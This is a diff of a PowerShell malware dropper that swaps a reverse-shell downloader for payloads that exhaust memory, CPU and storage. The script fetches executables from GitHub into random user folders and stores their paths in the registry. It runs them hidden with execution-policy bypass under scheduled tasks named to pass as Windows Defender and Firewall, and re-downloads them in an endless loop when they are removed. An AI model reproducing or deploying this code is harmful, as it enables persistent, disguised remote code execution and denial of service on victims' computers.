@@ -1,8 +1,11 @@
 param( [string]$basePath )
 
-$uri = "https://github.com/Soumyo001/powershell-reverseshell/raw/refs/heads/main/powershell-reverseshell-dns-tls.ps1"
-$propertyName = "revShell"
-
+$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.exe"
+$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.exe"
+$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
+$memPropertyName = "mem"
+$storagePropertyName = "store"
+$cpuPropertyName = "cpu"
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
 
 $paths =  @(
@@ -42,18 +45,40 @@ if([string]::IsNullOrEmpty($basePath)){
     }
 }
 
-$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+$itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorAction SilentlyContinue
 
-if(-not($item)){
+if(-not($itemMem)){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
-    $revShellPath = $paths[$idx]
-    $revShellPath = "$revShellPath\shell.exe"
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $revShellPath -Force | Out-Null
-    iwr -Uri $uri -OutFile $revShellPath
-}else { $revShellPath = $item.$propertyName }
+    $memHogPath = $paths[$idx]
+    $memHogPath = "$memHogPath\mem_hog.exe"
+    New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+    iwr -Uri $memHogUri -OutFile $memHogPath
+}else { $memHogPath = $itemMem.$memPropertyName }
 
-$shellTaskName = "windows defender profile"
-$shellTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$revShellPath'"
+# $itemStore = Get-ItemProperty -Path "$basePath" -Name $storagePropertyName -ErrorAction SilentlyContinue
+
+# if(-not($itemStore)){
+#     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+#     $storageHogPath = $paths[$idx]
+#     $storageHogPath = "$storageHogPath\storage_hog.exe"
+#     New-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
+#     iwr -Uri $storageHogUri -OutFile $storageHogPath
+# }else { $storageHogPath = $itemStore.$storagePropertyName }
+
+$threshold = Get-Random -Minimum 80 -Maximum 86
+$memHogTaskName = "windows defender profile"
+$storageHogTaskName = "windows firewall profile"
+$memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+$storageTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
+
+function Get-RamPercentage{
+    $mem = Get-WmiObject -Class Win32_OperatingSystem
+    $totMem = $mem.TotalVirtualMemorySize
+    $free = $mem.FreeVirtualMemory
+    $used = $totMem - $free
+    $percent = ($used / $totMem) * 100
+    return [math]::Round($percent, 2)
+}
 
 function CheckTask-And-Recreate {
     [CmdletBinding()]
@@ -122,14 +147,38 @@ function CheckTask-And-Recreate {
 
 while ($true) {
 
-    if(-not(Test-Path $revShellPath -PathType Leaf)){
-        $revShellPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-        $revShellPath = "$revShellPath\shell.exe"
-        iwr -Uri $uri -OutFile $revShellPath
-        $shellTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$revShellPath'"
-        Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $revShellPath -Force | Out-Null
-        if(schtasks /query /tn $shellTaskName){ schtasks /delete /tn $shellTaskName /f 2>&1 | Out-Null }
+    if(-not(Test-Path $memHogPath -PathType Leaf)){
+        $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $memHogPath = "$memHogPath\mem_hog.exe"
+        iwr -Uri $memHogUri -OutFile $memHogPath
+        $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+        Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+        if(schtasks /query /tn $memHogTaskName){ schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null }
     }
-    CheckTask-And-Recreate -taskName $shellTaskName -taskRunAction $shellTaskRunAction
+    # if(-not(Test-Path $storageHogPath -PathType Leaf)){
+    #     schtasks /end /tn $storageHogTaskName
+    #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+    #     $storageHogPath = "$storageHogPath\storage_hog.exe"
+    #     iwr -Uri $storageHogUri -OutFile $storageHogPath
+    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
+    #     Set-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
+    #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
+    #     schtasks /run /tn $storageHogTaskName
+    # }
+    CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
+    # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction
+
+    $curr = Get-RamPercentage
+    if($curr -ge $threshold){
+        $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
+        if($item){
+            $cpuHogPath = $item.$cpuPropertyName
+        }else{
+            $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
+            New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
+        }
+        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
+        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
+    }
 
 }
